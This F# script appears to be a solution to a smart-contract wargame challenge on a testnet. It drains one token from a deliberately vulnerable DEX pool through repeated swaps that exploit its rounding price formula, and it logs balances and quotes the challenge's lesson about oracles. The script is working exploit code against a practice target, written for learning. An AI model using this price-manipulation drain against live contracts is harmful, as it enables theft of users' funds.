#i """nuget: C:\Users\jon_h\source\repos\web3\web3.fs\bin\Release\"""
#r "nuget: web3.fs, 0.2.1" 

open web3.fs

// Values and partial applications
let env = createWeb3Environment "http://127.0.0.1:1248" "2.0" "0x2268b96e204379ee8366505c344ebe5cc34d3a46"

let call = makeEthCall env
let txn = makeEthTxn env

// use the webpage to deploy an instance, so that when we submit we get the blurb

// My instance: 0x2F66c4E29D19650CFA03b84A0D0c1705FDFB3C7c

// Goal here is to drain one of the tokens from the pool, so that it basically hangs during
// the 'price' derivation step

// After working the math manually on this, I believe that if I wash trade the max amount that I
// can through the pool over and over, I'll reap an increaing amount of the target token each time.
// Otherwise, (as far as I can tell) the pool actually slowly drains _my_ balance over time, and 
// I'll end up with no tokens.

let poolABI = """[{"inputs":[{"internalType":"address","name":"_token1","type":"address"},{"internalType":"address","name":"_token2","type":"address"}],"stateMutability":"nonpayable","type":"constructor"},{"inputs":[{"internalType":"address","name":"token_address","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"add_liquidity","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"approve","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"token","type":"address"},{"internalType":"address","name":"account","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"get_swap_price","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"swap","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"token1","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"token2","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"}]"""|> ABI

let pool = loadDeployedContract env "0x2F66c4E29D19650CFA03b84A0D0c1705FDFB3C7c" RINKEBY poolABI |> bindDeployedContract |> List.head

// first, I need to do the approvals the challenge set up for me

txn pool (ByString "approve") [Address "0x2F66c4E29D19650CFA03b84A0D0c1705FDFB3C7c"; Uint256 $"{(bigint.Pow(2, 256) - 1I).ToString()}"] ZEROV 
|> env.log Log

// Get the token addresses
let token1Addr = call pool (ByString "token1") [] |> env.log Emit |> unwrapCallResult |> List.head
let token2Addr = call pool (ByString "token2") [] |> env.log Emit |> unwrapCallResult |> List.head

// check my balances
let checkBalances () = 
    call pool (ByString "balanceOf") [token1Addr; Address "0x2268b96e204379ee8366505c344ebe5cc34d3a46"] |> env.log Log |> ignore
    call pool (ByString "balanceOf") [token2Addr; Address "0x2268b96e204379ee8366505c344ebe5cc34d3a46"] |> env.log Log |> ignore

// [+] Call result: [Uint256 "10"]
// [+] Call result: [Uint256 "10"]

// We're set. First call
txn pool (ByString "swap") [token1Addr; token2Addr; Uint256 "10"] ZEROV |> env.log Log

checkBalances()

// [+] Call result: [Uint256 "0"]
// [+] Call result: [Uint256 "20"]

// Now the real test
txn pool (ByString "swap") [token2Addr; token1Addr; Uint256 "20"] ZEROV |> env.log Log

checkBalances ()
// Yup, I'm gonna win
// [+] Call result: [Uint256 "24"]
// [+] Call result: [Uint256 "0"]

// repeated until I have 65 of token 2, after this it reverts. Check the pool's balances
let checkPoolBalances () =
    call pool (ByString "balanceOf") [token1Addr; Address "0x2F66c4E29D19650CFA03b84A0D0c1705FDFB3C7c"] |> env.log Log |> ignore
    call pool (ByString "balanceOf") [token2Addr; Address "0x2F66c4E29D19650CFA03b84A0D0c1705FDFB3C7c"] |> env.log Log |> ignore

checkPoolBalances ()

// [+] Call result: [Uint256 "110"]
// [+] Call result: [Uint256 "45"]

// Pool only has 45 of B left, so modified the swap to 45, and got this:
// [+] Call result: [Uint256 "110"] <- My A
// [+] Call result: [Uint256 "20"] <- My B
// [+] Call result: [Uint256 "0"] <- Pool A
// [+] Call result: [Uint256 "90"] <- Pool B

// The blurb was interesting:
(*
The integer math portion aside, getting prices or any sort of data from any single source is a massive attack vector in smart contracts.

You can clearly see from this example, that someone with a lot of capital could manipulate the price in one fell swoop, and cause any applications relying on it to use the the wrong price.

The exchange itself is decentralized, but the price of the asset is centralized, since it comes from 1 dex. This is why we need oracles. Oracles are ways to get data into and out of smart contracts. We should be getting our data from multiple independent decentralized sources, otherwise we can run this risk.

Chainlink Data Feeds are a secure, reliable, way to get decentralized data into your smart contracts. They have a vast library of many different sources, and also offer secure randomness, ability to make any API call, modular oracle network creation, upkeep, actions, and maintainance, and unlimited customization.

Uniswap TWAP Oracles relies on a time weighted price model called TWAP. While the design can be attractive, this protocol heavily depends on the liquidity of the DEX protocol, and if this is too low, prices can be easily manipulated.
*)
